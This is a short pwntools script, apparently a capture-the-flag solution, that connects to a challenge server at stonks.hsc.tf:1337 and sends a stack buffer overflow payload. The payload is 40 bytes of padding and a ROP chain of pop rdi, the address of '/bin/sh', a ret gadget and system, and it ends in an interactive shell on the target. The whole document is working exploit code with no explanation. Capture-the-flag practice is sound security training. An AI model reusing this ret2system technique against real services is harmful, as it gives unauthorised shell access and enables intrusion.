from pwn import *

elf = ELF('./chal')
context.binary = elf

#s = process('./chal')
s = remote('stonks.hsc.tf', 1337)

pop_rdi = 0x401363
binsh   = 0x402008
system  = elf.symbols.system
ret     = 0x0040101a

offset = 40
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)

s.sendline(payload)
s.interactive()
